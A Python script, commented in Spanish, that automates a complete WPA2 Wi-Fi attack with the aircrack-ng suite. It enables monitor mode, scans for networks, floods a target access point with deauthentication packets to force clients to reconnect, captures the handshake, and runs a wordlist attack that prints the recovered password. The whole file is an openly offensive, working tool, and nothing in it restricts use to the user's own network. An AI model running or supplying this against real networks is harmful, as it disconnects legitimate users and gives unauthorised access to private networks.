#!/usr/bin/env python3
"""
Captura de handshakes WPA2 usando aircrack-ng suite
"""
import subprocess
import time
import os
import sys

class WPACapturer:
    def __init__(self, interface, bssid=None, channel=None, output_file=None):
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.output_file = output_file or f"handshake_{int(time.time())}"
        self.monitor_mode = False
    
    def check_dependencies(self):
        """Verifica que las herramientas necesarias están instaladas"""
        tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
        for tool in tools:
            try:
                subprocess.run([tool], capture_output=True)
            except FileNotFoundError:
                print(f"❌ {tool} no encontrado. Instala aircrack-ng:")
                print("   sudo apt install aircrack-ng")
                return False
        return True
    
    def enable_monitor_mode(self):
        """Activa modo monitor en la interfaz"""
        print(f"🔧 Activando modo monitor en {self.interface}...")
        
        # Matar procesos que interfieren
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
        
        # Activar modo monitor
        result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface], 
                               capture_output=True, text=True)
        
        if 'mon' in result.stdout:
            self.monitor_interface = f"{self.interface}mon"
            self.monitor_mode = True
            print(f"✅ Modo monitor activado en {self.monitor_interface}")
            return True
        else:
            print("❌ Error activando modo monitor")
            return False
    
    def scan_networks(self, duration=30):
        """Escanea redes WiFi cercanas"""
        print(f"\n📡 Escaneando redes WiFi por {duration} segundos...")
        
        cmd = ['sudo', 'airodump-ng', self.monitor_interface, 
               '--output-format', 'csv', '-w', 'scan_temp']
        
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        process.terminate()
        
        # Mostrar resultados
        print("\n📊 Redes encontradas:")
        print("BSSID              CH  ENC   ESSID")
        print("-" * 50)
        
        try:
            with open('scan_temp-01.csv', 'r') as f:
                for line in f:
                    if ',' in line and 'WPA' in line:
                        parts = line.split(',')
                        if len(parts) > 13:
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            essid = parts[13].strip()
                            if bssid and essid:
                                print(f"{bssid}  {channel}   WPA2   {essid}")
        except:
            pass
        
        os.system('rm scan_temp-01.csv 2>/dev/null')
    
    def capture_handshake(self, target_bssid, target_channel, essid):
        """Captura handshake de una red específica"""
        print(f"\n🎯 Apuntando a: {essid} ({target_bssid}) en canal {target_channel}")
        
        # Cambiar canal
        subprocess.run(['sudo', 'iwconfig', self.monitor_interface, 'channel', target_channel])
        
        # Iniciar airodump para capturar handshake
        print(f"📡 Capturando handshake... (presiona Ctrl+C cuando se capture)")
        
        cmd = [
            'sudo', 'airodump-ng', self.monitor_interface,
            '--bssid', target_bssid,
            '--channel', target_channel,
            '--write', self.output_file
        ]
        
        # Iniciar airodump en segundo plano
        dump_process = subprocess.Popen(cmd)
        
        time.sleep(3)
        
        # Forzar deautenticación para capturar handshake más rápido
        print("💥 Enviando paquetes de deautenticación...")
        deauth_cmd = [
            'sudo', 'aireplay-ng', '-0', '5',
            '-a', target_bssid,
            self.monitor_interface
        ]
        
        subprocess.run(deauth_cmd, capture_output=True)
        
        print("⏳ Esperando handshake... (30 segundos)")
        time.sleep(30)
        
        dump_process.terminate()
        
        # Verificar si se capturó handshake
        cap_file = f"{self.output_file}-01.cap"
        if os.path.exists(cap_file):
            print(f"✅ Handshake capturado y guardado en: {cap_file}")
            
            # Verificar con aircrack
            verify = subprocess.run(['aircrack-ng', cap_file], capture_output=True, text=True)
            if '1 handshake' in verify.stdout:
                print("✅ Handshake verificado correctamente")
                return cap_file
            else:
                print("⚠️  Handshake incompleto o inválido")
        
        print("❌ No se capturó handshake")
        return None
    
    def crack_handshake(self, cap_file, wordlist):
        """Crackea handshake capturado con wordlist"""
        print(f"\n🔓 Crackeando handshake con wordlist: {wordlist}")
        
        cmd = ['aircrack-ng', cap_file, '-w', wordlist]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if 'KEY FOUND' in result.stdout:
            # Extraer contraseña
            for line in result.stdout.split('\n'):
                if 'KEY FOUND' in line:
                    password = line.split('[')[1].split(']')[0]
                    print(f"✅ CONTRASEÑA ENCONTRADA: {password}")
                    return password
        
        print("❌ No se encontró la contraseña en el wordlist")
        return None
    
    def cleanup(self):
        """Limpia y desactiva modo monitor"""
        if self.monitor_mode:
            print("\n🧹 Limpiando y desactivando modo monitor...")
            subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface], 
                          capture_output=True)
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], 
                          capture_output=True)
            print("✅ Limpieza completada")
    
    def run_full_attack(self, wordlist=None):
        """Ejecuta ataque completo: escaneo, captura, crackeo"""
        if not self.check_dependencies():
            return
        
        if not self.enable_monitor_mode():
            return
        
        try:
            # Escanear redes
            self.scan_networks(30)
            
            if not self.bssid:
                print("\n📝 Especifica el BSSID objetivo con --bssid")
                return
            
            # Capturar handshake
            cap_file = self.capture_handshake(self.bssid, self.channel or 1, "Target")
            
            # Crackear si se capturó y hay wordlist
            if cap_file and wordlist:
                self.crack_handshake(cap_file, wordlist)
            
        except KeyboardInterrupt:
            print("\n⚠️  Interrumpido por usuario")
        finally:
            self.cleanup()
